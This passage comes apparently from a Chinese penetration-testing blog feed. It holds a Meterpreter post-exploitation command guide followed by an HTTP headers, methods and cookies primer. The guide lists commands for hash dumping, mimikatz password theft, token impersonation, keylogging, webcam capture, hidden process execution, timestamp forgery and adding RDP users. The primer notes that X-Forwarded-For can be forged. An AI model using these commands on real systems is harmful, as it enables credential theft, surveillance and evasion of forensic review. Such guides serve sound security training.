查看需要哪些配置</li><li>set RHOSTS IP</li><li>run</li></ol>        <h2 id="8-3-FTP-版本扫描">          <a href="#8-3-FTP-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.3. FTP 版本扫描</h2>      <ol><li>执行 use auxiliary/scanner/ftp/ftp_version</li><li>show options  查看需要哪些配置</li><li>set RHOSTS IP</li><li>run</li></ol>        <h1 id="九-Meterpreter的后期攻击使用方法">          <a href="#九-Meterpreter的后期攻击使用方法" class="heading-link"><i class="fas fa-link"></i></a>九.Meterpreter的后期攻击使用方法</h1>              <h2 id="9-1-上传文件到Windows主机">          <a href="#9-1-上传文件到Windows主机" class="heading-link"><i class="fas fa-link"></i></a>9.1.上传文件到Windows主机</h2>      <p>简单地来说，你可以上传本机的任意文件到目标主机，</p><p>命令：<code>upload&lt;file&gt;&lt;destination&gt;</code>        </p><p>(注意，file是包括它自己的路径的，同时，使用 -r 参数可以递归上传要上传的目录和文件)</p><p>例如：<code>upload -r /home/haoye.exe c:\\</code> （注意，这里要有两个 \ )</p>        <h2 id="9-2-从Windows主机上下载文件">          <a href="#9-2-从Windows主机上下载文件" class="heading-link"><i class="fas fa-link"></i></a>9.2.从Windows主机上下载文件</h2>      <p>download命令可以下载远程主机里的文件</p><p>命令：<code>download&lt;file&gt;&lt;path to save&gt;</code>               例如：<code>download C://haoye.rtf /home</code></p><p>注意：Windows路径要加双斜线，我们如果要递归下载整个目录包括子目录和文件，我们可以使用download -r 的命令</p><p>例如：</p>        <h2 id="9-3-在目标主机上执行-exe-文件">          <a href="#9-3-在目标主机上执行-exe-文件" class="heading-link"><i class="fas fa-link"></i></a>9.3.在目标主机上执行 exe 文件</h2>      <p>我们也可以用 execute 命令在目标主机上执行exe的应用程序</p><p>命令：<code>execute -f &lt;path&gt;[options]</code></p><p>例如：<code>execute -f c:\\haoye.exe</code>(双反斜杠)</p>        <h2 id="9-4-创建CMD新通道">          <a href="#9-4-创建CMD新通道" class="heading-link"><i class="fas fa-link"></i></a>9.4.创建CMD新通道</h2>      <p>如果想在目标主机执行命令提示符</p><p>命令：<code>execute -f cmd -c</code>(这都是在 meterpreter 模式下的操作，类似于 shell 的命令)</p>        <h2 id="9-5-显示进程">          <a href="#9-5-显示进程" class="heading-link"><i class="fas fa-link"></i></a>9.5.显示进程</h2>      <p>ps命令会显示目标主机所有正在运行的进程</p><p>命令：<code>ps</code>  （和windows任务管理器查看内容是一样的）</p>        <h2 id="9-6-获取admin权限">          <a href="#9-6-获取admin权限" class="heading-link"><i class="fas fa-link"></i></a>9.6.获取admin权限</h2>      <p>getsystem命令可以提权到本地系统权限</p><p>命令：<code>getsystem</code></p>        <h2 id="9-7-使用-Hashdump-转储所有-hash-值">          <a href="#9-7-使用-Hashdump-转储所有-hash-值" class="heading-link"><i class="fas fa-link"></i></a>9.7.使用 Hashdump 转储所有 hash 值</h2>      <p>我么可以使用 meterpreter shell 来 dump 目标主机当前系统账户和密码，转储的内容是 NTLM 哈希格式</p><p>NTLM 在线破解 ：<span class="exturl"><a class="exturl__link" href="http://hashkiller.co.uk/ntlm-decrypter.aspx">http://hashkiller.co.uk/ntlm-decrypter.aspx</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>命令：<code>hashdump</code></p><p>输出的每一行格式如下：usrname：ID…..</p><p>它会得到几个不同权限的账号和 hash 密码</p>        <h2 id="9-8-使用-Credcollect-转储-hash-值">          <a href="#9-8-使用-Credcollect-转储-hash-值" class="heading-link"><i class="fas fa-link"></i></a>9.8.使用 Credcollect 转储 hash 值</h2>      <p>还有一个类似的脚本叫 credential_collector ,也可以收集目标主机的 tokens </p><p>命令：<code>run credcollect</code></p>        <h2 id="9-9-创建端口转发">          <a href="#9-9-创建端口转发" class="heading-link"><i class="fas fa-link"></i></a>9.9.创建端口转发</h2>      <p>用途：当对方主机是在内网的情况下</p><p>meterpreter shell中的portfwd命令是转发技术中最常用的一个命令， 可以让攻击系统访问本来无法直接访问的目标主机。<br>add选项会将端口转发添加到列表中，而且本质上会创建一个隧道。</p><p>请注意:这个隧道存在于 meterpreter 控制台之外，任何终端会话都可以使用。</p><p>命令：portfwd add -l 6666 -p 3389 -r 127.0.0.1        #将目标机的3389端口转发到本地6666端口。(本地端口不能被占用)</p>        <h2 id="9-10-删除端口转发">          <a href="#9-10-删除端口转发" class="heading-link"><i class="fas fa-link"></i></a>9.10.删除端口转发</h2>      <p>和创建端口转发命令类似，这条命令是删除一条端口转发记录</p><p>命令：<code>portfwd delete -l &lt;portnumber&gt; -p &lt;portnumber&gt; -r &lt;Target IP&gt;</code> n</p><p>如果你想显示所有端口转发记录，你可以使用 portfwd list 命令，</p><p>如果你想删除所有端口转发记录，你可以使用 portfwd flush 命令。</p>        <h2 id="9-11-在目标主机上搜索文件">          <a href="#9-11-在目标主机上搜索文件" class="heading-link"><i class="fas fa-link"></i></a>9.11.在目标主机上搜索文件</h2>      <p>搜索命令可以定位查找目标主机上特定的文件，这个命令可以搜索整个文件系统，也可以用来搜索特定的文件夹。</p><p>例如，如果你想搜索目标主机上的所有 txt 文件，可以使用如下命令；</p><p>命令：search -f *.txt</p>        <h2 id="9-12-获取用户-ID">          <a href="#9-12-获取用户-ID" class="heading-link"><i class="fas fa-link"></i></a>9.12.获取用户 ID</h2>      <p>getuid 命令会显示主机上与运行 meterpreter 服务的用户</p><p>命令：getuid</p>        <h2 id="9-13-获取系统信息">          <a href="#9-13-获取系统信息" class="heading-link"><i class="fas fa-link"></i></a>9.13.获取系统信息</h2>      <p>sysinfo 命令会显示 系统名，操作系统，架构 ，语言等。</p><p>命令：sysinfo</p>        <h2 id="9-14-模拟任何用户（token-操作）">          <a href="#9-14-模拟任何用户（token-操作）" class="heading-link"><i class="fas fa-link"></i></a>9.14.模拟任何用户（token 操作）</h2>      <p>这个进程对于攻击像微软活动目录这样的分布式系统非常有帮助，因为在微饮活动目录中，本地访问权限并没多大用，但是如果能搞到凭证尤其是管理员凭证，那就非常有用了。</p><p>incognito 最开始是一个独立的应用，当你成功入侵系统后可以用它来模拟用户tokens。这个应用后来集成到了metaploit 中,并且最终集成到了meterpreter 中，使用如下:</p><ol><li><p>在 meterpreter 会话中加载这个模块非常简单，只要输入use incognito 命令即可。</p></li><li><p>输入list_tokens -u 来显示所有有效的tokens</p></li><li><p>然后我们需要模拟某个token来获取其权限。还有注意，如果成功模拟了一个token，我们可以使用 getuid 命令来检查当前用户ID。</p></li><li><p>切换到最高权限（SYSTEM），输入：impersonate_token “NT AUTHORITY\SYSTEM”   (注意：SYSTEM权限是比管理员还要高的)</p><p>use incognito -&gt;list_tokens -u -&gt; getuid -&gt; impersonate_token “NT AUTHORITY\SYSTEM”</p></li></ol>        <h2 id="9-15-webcam-摄像头命令">          <a href="#9-15-webcam-摄像头命令" class="heading-link"><i class="fas fa-link"></i></a>9.15 webcam 摄像头命令</h2>      <p>webcam_list  ：查看摄像头</p><p>webcam_snap  ：通过摄像头拍照</p><p>webcam_stream ：通过摄像头开启视频</p>        <h2 id="9-16-execute-执行文件">          <a href="#9-16-execute-执行文件" class="heading-link"><i class="fas fa-link"></i></a>9.16. execute 执行文件</h2>      <p>execute  ：在目标机中执行文件</p><p>execute -H / -i -f cmd.exe    # 创建新的 cmd 进程；-H 不可见；-i 交互(-i 不要加，加了在目标主机就会看到CMD的命令符界面)</p>        <h2 id="9-17-timestomp-伪造时间戳">          <a href="#9-17-timestomp-伪造时间戳" class="heading-link"><i class="fas fa-link"></i></a>9.17. timestomp 伪造时间戳</h2>      <p>timestomp C:// -h       #查看帮助</p><p>timestomp -v C://2.txt     #查看时间戳</p><p>timestomp C://2.txt -f C://1.txt     #将1.txt 的时间戳复制给 2.txt （-f 的参数是复制的意思，后面的复制给前面）（不能找正在运行的文件，将其日期赋值给别的文件，否则会失败的）</p>        <h2 id="9-18-查看盘的所有文件和时间">          <a href="#9-18-查看盘的所有文件和时间" class="heading-link"><i class="fas fa-link"></i></a>9.18. 查看盘的所有文件和时间</h2>      <p><code>dir C:\\</code>(双斜杠)     #查看C盘所有文件及日期</p>        <h2 id="9-19-enable-rdp-脚本开启3389（远程桌面连接）">          <a href="#9-19-enable-rdp-脚本开启3389（远程桌面连接）" class="heading-link"><i class="fas fa-link"></i></a>9.19. enable_rdp 脚本开启3389（远程桌面连接）</h2>      <p>run post/windows/manage/enable_rdp    #开启远程桌面</p><p>run post/windows/manage/enable_rdp USERNAME=haoye PASSWORD=12345   #添加用户密码</p><p>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662    #将3389端口转发到6662</p><p>脚本位于：/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</p><p>通过 rdp.rb 脚本可知：开启 rdp 是通过 reg 修改注册表；添加用户是调用 cmd.exe 通过net user 添加；</p><p>端口转发是利用 portfwd 命令。</p>        <h2 id="9-20-键盘记录（这个得靠运气）">          <a href="#9-20-键盘记录（这个得靠运气）" class="heading-link"><i class="fas fa-link"></i></a>9.20. 键盘记录（这个得靠运气）</h2>      <p>keyscan_start       #开启键盘记录</p><p>keyscan_dump     #导出记录数据</p><p>keyscan_stop       #结束键盘记录</p>        <h2 id="9-21-桌面抓图">          <a href="#9-21-桌面抓图" class="heading-link"><i class="fas fa-link"></i></a>9.21. 桌面抓图</h2>      <p>screenshot      </p>        <h2 id="9-22-获取系统管理密码">          <a href="#9-22-获取系统管理密码" class="heading-link"><i class="fas fa-link"></i></a>9.22. 获取系统管理密码</h2>      <p>想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。</p><p>第一步：载入mimikatz</p><ol><li>meterpreter &gt; load mimikatz<br>第二步：使用命令wdigest获取密码</li></ol><p>其他详细信息，查看：<span class="exturl"><a class="exturl__link" href="http://xz.aliyun.com/t/2536%EF%BC%88%E5%88%AB%E4%BA%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%89">http://xz.aliyun.com/t/2536（别人的博客）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web应用程序</title>
      <link href="2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/"/>
      <url>2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="HTTP请求">          <a href="#HTTP请求" class="heading-link"><i class="fas fa-link"></i></a>HTTP请求</h1>      <p>在抓包时，通常有HTTP/1.1或者1.0，1.1或者1.0是因特网上网的HTTP版本，许多浏览器默认使用的都是1.1版本，1.0的比较老了。这两个版本规范之间存在一定的差异，然而，当攻击web应用程序时，web渗透测试工程师可能遇到的唯一差异是1.1的版本必须使用Host请求头。</p><p>Host：就是域名，访问网站的IP地址。</p><a id="more"></a><p>Accept-Encoding：浏览器支持的压缩编码是gzip和deflate。（当前的请求的http页面是经过压缩的，用于增加用户体验，访问更快了，但是会给服务器带来一定的压力，因为它要做压缩距离）</p><p>Accept-Language：浏览器支持的语言类型是中文和简体中文，优先支持简体中文。zh-cn表示简体中文，zh表示中文；q是权重系数，在0-1之间，q值越大，请求越倾向于获得其“：”之前的类型表示的内容，若没有指定的q值，默认为1，若被赋值0，则用于提醒服务器哪些是浏览器不支持的内容类型。</p><p>Cookie：消息头用于提交服务器向客户端发布的其他参数</p><p>Connection：clsoe/keep-live, 与网站的连接状态；close的服务器配置比较好，在访问人数过多的时候，如果一直是keep的状态，会消耗很多的服务器资源，因为TCP的连接数是有限的。</p><p>Cache-Control：这个消息头用于向服务器发送缓存的指令（如：no-cache，没有缓存)</p><p>Upgrade-insecure-Requests：该指令用于让浏览器自动升级请求从http升到https，用于大量包含http资源的http网页直接升级到https不会报错，间洁地来说，就是在http和https之间起着过渡作用。（只用https才有这个字段，强行切换成https，有加密的，解决安全问题）</p><p>User-Agent：代表自己的浏览器版本和自己本机的操作系统版本。注意：由于历史原因，大多数浏览器中都包含Mozilla这个前缀，这是因为最初占支配地位的Netscape浏览器使用了User-Agent字符串，而其他浏览器也希望让web站点相信它们与这种标准兼容。</p><p>Accept：浏览器支持的MIME类型分别是text/html，application/xhtml+xml，application/xml，x/x,，优先顺序按从左到右的顺序（表示当前浏览器希望接受什么类型的文件，这是请求首部，当服务器没有客户端想要的资源的媒体资源类型时，会返回 406 Not Acceptable 响应，当然，使用了x/x代表接受任意类型的资源，所以不会看到这个响应。另外，这里的q代表权重，在0-1之间，可以理解成客户端在这些给定的类型中，想优先接受什么类型，服务器可以根据客户端要求返回响应的资源。（如果没有，则默认为1。这里前面几个类型都没有标注，则默认为1，表示优先这些类型。后面0.9表示前面都没有就用这个，最后 的0.8表示，都没有的话任意类型都可以）</p><p> <strong>详解：</strong></p><p>​        text/html，application/xhtml+xml，application/xml可以理解为媒体类型和内容类型，/前面时 type（类型），/ 后面是        subtype（子类型）：type指定大的范围，subtype是type中范围更加明确的类型，即大类中的小类。</p><p>​        Text：用于标准化地表示文本信息，文本消息可以是多种字符集和或者多种格式的</p><p>​        text/html：表示html文档</p><p>​        Application：用于传输应用程序数据或者二进制数据。</p><p>​        application/xhtml+xml：表示xhtml文档</p><p>​        application/xml：表示xml文档</p><p>Referer：当前页面是由什么网页跳转而来的，可以用于防盗链，意思就是加了这个，当当前页面不是从它应该从的跳转页面而来的视为非法。</p><p>ETag：这个消息头用于指定一个实体标签，客户端可在将来的请求中提交这个标识符，获得和If-None-Match消息头中相同的资源，通知服务器浏览器当前缓存中保存的是哪个版本的资源。</p><p>Enprires：这个消息头用于向浏览器说明消息主体内容的有效时间，在这个有效时间之前，浏览器可以使用这个资源的缓存副本。</p><p>Location：这个消息头用于在重定向响应（那些状态码为3开头的响应）中说明重定向的目标。</p><p>Pragma：消息头指示浏览器不要将响应保存在缓存中。Expires 消息头指出响应内容已经过期因此不应保存在缓存中。当返回动态内容时常常会发送这些指令，以确保浏览器随时获得最新内容。</p><p>X_FORWARDED_FOR：用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求字段。（可以进行伪造绕过当前的网页，进入下一个网页，例如：X_FORWARDED_FOR：10.0.0.1，就可以直接访问10.0.0.1）</p><p>Authorization：这个消息头用于为一种内置HTTP身份验证向服务器提交证书。</p><p>If-Modified-Since：这个消息头用于说明浏览器最后一次收到所请求的资源的时间。如果自那以后资源没有发生变化，服务器就会发出一个带状态码304的响应，指示客户端使用资源的缓存副本。</p><p>If-None -Match：这个消息头用于指定- 一个实体标签。实体标签是-一个说明消息主体内容的标识符。当最后一次收到所请求的资源时.浏览器提交服务器发布的实体标签。服务器可以使用实体标签确定浏览器是否使用资源的缓存副本。</p><p>0rigin：这个消息头用在跨域Ajax t求中，用于指示提出请求的域。</p>        <h1 id="HTTP响应">          <a href="#HTTP响应" class="heading-link"><i class="fas fa-link"></i></a>HTTP响应</h1>      <p>HTTP/1.1 200 OK：证明当前网页正常访问</p><p>Server：消息头中包含一个旗标，指明所使用的Web服务器软件，有时还包括其他信息，如：所安装的模块和服务器操作系统，但其中所包含的信息可能不准确。（服务器类型，什么nginx之类的）</p><p>Set-Cookie：消息头向浏览器发送另一个cookie，它将随后向服务器发送的请求中由Cookie消息头返回。</p><p>Pragma ：消息头指示浏览器不要将响应保存在缓存中。Expires 消息头指出响应内容已经过期因此不应保存在缓存中。当返回动态内容时常常会发送这些指令，以确保浏览器随时获得最新内容。</p><p>几乎所有的HTTP响应在消息头后的空白行下面都包含消息主体，Content-Type 消息头示这个消息主体中包含一个HtML文档。</p><p>Content-Length：消息头规定消息主体的字节长度。</p><p>ETag：w/”59a3dc83-f61”浏览器根据HTTP请求的ETag验证请求的资源是否发生了改变，如果它未发生变化，服务器将返回“304 Not Modified” 响应，并且资源从浏览器缓存中读取，这样就不必再次下载请求。（也是与缓存有关的，就是我缓存过这个文件，下次我再访问时服务器就不会再次下载这个文件了，这个缓存是已经下载到我们的本地了）</p><p>Vary：Accept-Encoding”标头：说明对方网站一般启用了GZip压缩</p><p>Expires：RFC 2616 (HTTP/1. 0)协议中和网页缓存相关字段。用来控制缓存的失效日期。</p><p>Content-Length：代表请求的数据包，就是html文件的长度大小，渗透测试或者是暴力破解就是根据这个来判断，正确的密码和错误的密码是不一样的。</p><p>X-Powered-By：网站使用的框架（如：thinkphp)</p><p>X-Frame-Options：这个消息头指示浏览器框架是否及如何加载当前响应。</p><p>Last-Modified：说明对于访问的文件，服务器的运维人员最后一次修改的日期。</p><p>Location：这个消息头用于在重定向响应（那些状态码为3开头的响应）中说明重定向的目标。</p><p>Access-Control-Allow-Origin：这个消息头用于指示可否通过跨域Ajax请求获取资源。</p><p>WWW-Authenticate：这个消息头用在带401状态码的响应中，提供与服务器所支持的身份验证类型有关的信息。（系统支持的身份认证，windows和Linux支持的）</p>        <h1 id="HTTP方法">          <a href="#HTTP方法" class="heading-link"><i class="fas fa-link"></i></a>HTTP方法</h1>      <p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。</p><p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p><p>当渗透测试员攻击Web应用程序时,几乎肯定会遇到最常用的方法:GET和POST.这些方法之间存在-些必须了解的重要差异，忽略这些差异可能会危及应用程序的安全。</p>        <h2 id="1-GET">          <a href="#1-GET" class="heading-link"><i class="fas fa-link"></i></a>1.GET</h2>      <p>GET方法的作用在于获取资源。它可以用于URL查询字符串的形式向所请求的资谏发送参数。这使用户可将一个包含动态资源的UrL标注为书签，用户自己或其他用户随后可重复利用该书签来获取等价的资源(作用与标注为书签的搜索查询相似)。URL显示在屏幕上.并被记录在许多地方，如浏览器的历史记录和Web服务器的访问旧志中。如果单击外部链接，还可以用Referer消息头将它们传送到其他站点。因此，请勿使用查询字符申传送任何敏感信息。</p>        <h2 id="2-POST">          <a href="#2-POST" class="heading-link"><i class="fas fa-link"></i></a>2.POST</h2>      <p>POST方法期初是用来向服务器输入数据的，实际上，通常会用它来支持HTML的表单。表单中填好的数据通常会被送给服务器，然后由服务器将其发送到它要去的地方。</p>        <h2 id="3-HEAD">          <a href="#3-HEAD" class="heading-link"><i class="fas fa-link"></i></a>3.HEAD</h2>      <p>HEAD方法和GET方法的行为很类似，但是服务器在响应中只返回首部，不会返回实体的主体部分。这就允许客户端在未获取实际资源的情况下，对资源的首部进行检查。（优点：在不获取资源的情况下了解资源的情况（比如：判断其类型）；通过查看响应的状态码，看看某个对象是否存在；通过查看首部，测试资源是否被修改了）。</p>        <h2 id="4-PUT">          <a href="#4-PUT" class="heading-link"><i class="fas fa-link"></i></a>4.PUT</h2>      <p>PUT与GET从服务器读取文档想法，PUT方法会向服务器写入文档。PUT方法的语义就是让服务器用请求的主体部分来创建一个由所请求的URL命名的新闻的，或者替换已存在的URL。</p>        <h2 id="5-TRACE">          <a href="#5-TRACE" class="heading-link"><i class="fas fa-link"></i></a>5.TRACE</h2>      <p>客户端发起一个请求时，这个请求可能要穿过防火墙、代理、网关或者其他一些应用程序。每个中间节点都可能会修改原始的HTTP请求。TRACE方法允许客户端在最终将请求发送给服务器时，看看它变成什么样子了。        TRACE请求会在目的服务器端发起一个“环回”诊断。行程最后一站的服务器会弹回一条TRACE响应，并在响应主体中携带它收到的原始请求报文。这样客户端就可以查看在所有中间HTTP应用程序组成的请求/响应链上，原始报文是否被毁坏，以及如何被毁坏或修改过。</p><p>TRACE方法主要用于诊断，用于验证请求是否如愿穿过了请求/响应链。可以用来查看代理和其他应用程序对用户请求所产生的效果。        TRACE的缺点是：它假定中间应用程序对各种不同类型请求的处理是相同的。很多HTTP应用程序会根据方法的不同做出不同的事情，例如代理会把POST请求直接发给服务器，而GET请求发送给另一个HTTP应用改程序（比如缓存）。TRACE不提供区分这些方法的机制，通常中间应用程序会自行决定对TRACE请求的处理方式。        TRACE请求中不能带有实体的主体部分。TRACE响应的实体主体部分包含了响应服务器收到的请求的精确副本。</p>        <h2 id="6-OPTIONS">          <a href="#6-OPTIONS" class="heading-link"><i class="fas fa-link"></i></a>6.OPTIONS</h2>      <p>OPTIONS方法请求Web服务器告知其支持的各种功能。可以询问服务器通常支持哪些方法，或者对某些特殊资源支撑哪些方法。（有些服务器可能只支持对一些特殊类型的对象使用特定的操作）        这为客户端应用程序提供了一种手段，使其不用实际访问那些资源就能判定访问各种资源的最优方式</p>        <h2 id="7-DELETE">          <a href="#7-DELETE" class="heading-link"><i class="fas fa-link"></i></a>7.DELETE</h2>      <p> DELETE方法所做的事情就是请服务器删除请求URL所指定的资源。但客户端应用程序无法保证删除操作一定会被执行。因为HTTP规范允许服务器在不通知客户端的情况下撤销请求。</p>        <h2 id="8-CONNECT">          <a href="#8-CONNECT" class="heading-link"><i class="fas fa-link"></i></a>8.CONNECT</h2>      <p>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</p>        <h2 id="9-PATCH">          <a href="#9-PATCH" class="heading-link"><i class="fas fa-link"></i></a>9.PATCH</h2>      <p>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</p>        <h2 id="10-GET和POST的区别">          <a href="#10-GET和POST的区别" class="heading-link"><i class="fas fa-link"></i></a>10.GET和POST的区别</h2>      <p>1、GET请求的数据是放在HTTP包头中的，也就是URL之后，通常是像下面这样定义格式的：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%E5%A5%BD其中，以?来分隔URL和数据；以&amp;来分隔参数；如果数据是英文或数字，原样发送；如果数据是中文或其它字符，则进行BASE64编码。而Post是把提交的数据放在HTTP正文中的。       </p><p> 2、GET提交的数据比较少，最多1024B，因为GET数据是附在URL之后的，而URL则会受到不同环境的限制的，比如说IE对其限制为2K+35，而POST可以传送更多的数据（理论上是没有限制的，但一般也会受不同的环境，如浏览器、操作系统、服务器处理能力等限制，IIS4可支持80KB，IIS5可支持100KB）。        </p><p>3、Post的安全性要比Get高，因为Get时，参数数据是明文传输的，参数直接暴露在url中，所以不能用来传递敏感信息。而且使用GET的话，还可能造成Cross-site request forgery攻击。而POST数据则可以加密的，但GET的速度可能会快些。        4、get请求只能进行url编码，而post支持多种编码方式；get请求会浏览器主动cache，而post支持多种编码方式；get请求参数会被完整保留在浏览历史记录里，而post中的参数不会被保留。        </p><p>5、GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。        </p><p>6、GET产生一个TCP数据包；POST产生两个TCP数据包。对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</p>        <h2 id="11-扩展方法">          <a href="#11-扩展方法" class="heading-link"><i class="fas fa-link"></i></a>11.扩展方法</h2>      <p>http被设计成可扩展的，这样新特性就不会使老的版本失效。扩展方法指的是没在HTTP/1.1中规范定义的，服务器为它管理的资源实现一些HTTP服务，为开发者提供了一种扩展这些HTTP服务能力的手段        </p><p>下表列出了一些常用的扩展方法：        </p><p>LOCK:允许用户“锁定资源”编辑某个资源时将其锁定，以防别人同时对其修改        </p><p>MKCOL:允许用户创建资源        </p><p>COPY:便于在服务器上复制资源        </p><p>MOVE:在服务器上移动资源        </p><p>上面例子中的方法便于用过http将web内容发布到web服务器上。        </p><p>不是所有的扩展都是在正式规范中定义的，因此，扩展方法秉持“对发送内容要求严格，对所接受的内容宽容点”来处理一般的HTTP扩展方法很重要。</p>        <h1 id="Cookie">          <a href="#Cookie" class="heading-link"><i class="fas fa-link"></i></a>Cookie</h1>              <h2 id="1-cookie是什么">          <a href="#1-cookie是什么" class="heading-link"><i class="fas fa-link"></i></a>1.cookie是什么</h2>      <p>由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢?那就给每次新的用户请求时，给它颁发一个身份证(独一无二)吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。</p><p>其实cookie是一个很小的文本文件,是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie,这些cookie可以用来辨别用户身份信息等作用。</p><p><strong>例如</strong>：</p><p>HTTP/1 0200 OK</p><p>Set-Cookie：id= 23451 * domain “ zhuanzhuan 58 com *Conent-type text/html</p><p>Content-length: 1287</p><p>用户首次访问服务器，服务器会返回一个独-无二的识别码，id=23451，这样服务器可以用这个码跟踪记录用户的信息，(购物历史， 地址信息等) 。</p><p>cookie可以包含任意的信息，不仅仅是id,客户端会记录服务器返回来的Set Cookie首部中的cookie内容。并将cookie 存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XxX的身份证(cookie) ，并在Cookie请求首部发送过去。   </p>        <h2 id="2-cookie利用">          <a href="#2-cookie利用" class="heading-link"><i class="fas fa-link"></i></a>2.cookie利用</h2>      <p>cookie是大多数Web应用程序所依赖的HTTP协议的一一个关键组成部分，攻击者常常通过它来。利用Web应用程序中的漏洞。服务器使用cookie 机制向客户端发送数据，客户端保存cookie 并将其返回给服务器。与其他类型的请求参数(存在于URL 查询字符串或消息主体中)不同，无须应用程序或用户采取任何特殊措施.随后的每一个请求 都会继续重新向服务器提交cookie。</p><p>如前所述，服务器使用Set-Cookie响应消息头发布cookie；</p><p>Set-Cookie: tracking=tI8rk7 jllx44S2u85nSWcw（一般的也是持久cookie，设定一定的到期日期，不会随着浏览器的关闭导致cookie的被删除）</p><p>然后，用户的浏览器自动将下面的消息头进行添加，随后返回给同一服务器的请求中；</p><p>Cookie: tracking=tl8rk7jolx44S2Uu85nSWcu</p><p>如上所示. cookie -般由一个名/值对构成，但也可包含任何不含空格的字符串。可以在服务，器响应中使用几个Set-Cookie消息头发布多个cookie.并可在同一个Cookie消息头中用分号分隔不同的cookie,将它们全部近回给服务器。</p><p>除cookie的实际位外，Set-Cookie 消息头还可包含以下任何可选属性，用它们控制浏览器处理cookie的方式。</p><p>expires：用于设定cookie的有效时间。这样会使浏览器将cookie保存在永久性的存储器中，在随后的浏览器会话中重复利用，直到到期时间为止。如果没有设定这个属性，那么cookie 仅用在当前浏览器会话中。（cookie过期的日期）</p><p>domain：用于指定cookie的有效域。这个域必须和收到cookie的域相同，或者是它的父域。</p><p>path：用于指定cookie的有效URL路径。</p><p>secure：如果设置这个属性，则仅在HTTPS请求中提交cookie。</p><p>HttpOnly.：如果设置这个属性， 将无法通过客户端JavaScript直接访问cookie. 。</p><p>上述每一个cookie属性都可能影响应用程序的安全其造成的主要不利影响在于攻击者能够，直接对应用程序的其他用户发动攻击。</p>        <h2 id="3-cookie的类型">          <a href="#3-cookie的类型" class="heading-link"><i class="fas fa-link"></i></a>3.cookie的类型</h2>      <p>可以按照过期时间分为两类：会话cookie和持久cookie.</p><p>会话cookie是一-种临时 cookie,用户退出浏览器，会话Cooke就会被删除了；持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性 访问服务器的配置文件或者置录信息。</p>        <h2 id="4-cookie的属性">          <a href="#4-cookie的属性" class="heading-link"><i class="fas fa-link"></i></a>4.cookie的属性</h2>              <h3 id="cookie域">          <a href="#cookie域" class="heading-link"><i class="fas fa-link"></i></a>cookie域</h3>      <p>产生Cookie的服务器可以向set- Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie</p><p>例如：Set-Cookie：name=”wang”; domain=”m. zhuanzhuan. 58. com”</p><p>如果用户访问的是m.zhuanzhuan.58.com，那就会发送cookie：name=”wang”；如果是访问<span class="exturl"><a class="exturl__link" href="http://www.aaa.com(而不是这个m.zhuanzhuan.58.com),就不会发送这个cookie./">www.aaa.com（而不是这个m.zhuanzhuan.58.com)，就不会发送这个cookie。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="cookie的路径path">          <a href="#cookie的路径path" class="heading-link"><i class="fas fa-link"></i></a>cookie的路径path</h3>      <p>Path属性可以为服务器特定文档指定Cooke,这个属性设置的url且带有这个前缀的url路径都是有效的。</p><p>例如：m.zhuanzhuan.58.com和m.zhuanzhuan.58.com/user/这连个url，</p><ol><li><p>m.zhuanzhuan.58.com设置cookie：</p><p>Set-cookie：id=”123432” ; domain=”m. zhuanzhuan. 58. com”</p></li><li><p>m.zhuanzhuan.58.com/user/设置cookie</p><p>Set-cookie：user=”wang” , domain=”m. zhuanzhuan. 58. com”;path=/user/</p></li><li><p>other</p><p>但是访问其他路径：m.zhuanzhuan.58.com/other/就会获得：cookie：id=”123432”</p><p>如果访问m.zhuanzhuan.58.com/user/就会获得：cookie：id=”123432”;cookie：user=”wang”</p></li></ol>        <h3 id="secure">          <a href="#secure" class="heading-link"><i class="fas fa-link"></i></a>secure</h3>      <p>设置了属性secure, cookie只有在https协议加密情况下才会发送给服务端，但是这并不是最安全的，由于其固有的不安全性，教感信息也是不应该通过cookie传输的.</p><p>Set-Cookie：id-a3fWa；Expires=Wed，21 Oct  2015  07:28:00 GMT，Secure；chrome 52和firefox 52开始不安全的(HTTP)是无法快用secure的。</p>        <h1 id="操作Cookie">          <a href="#操作Cookie" class="heading-link"><i class="fas fa-link"></i></a>操作Cookie</h1>      <p>通过docuemnt.cookie可以设置和获取Cookie的值</p><p>document.cookie =”user=wang” 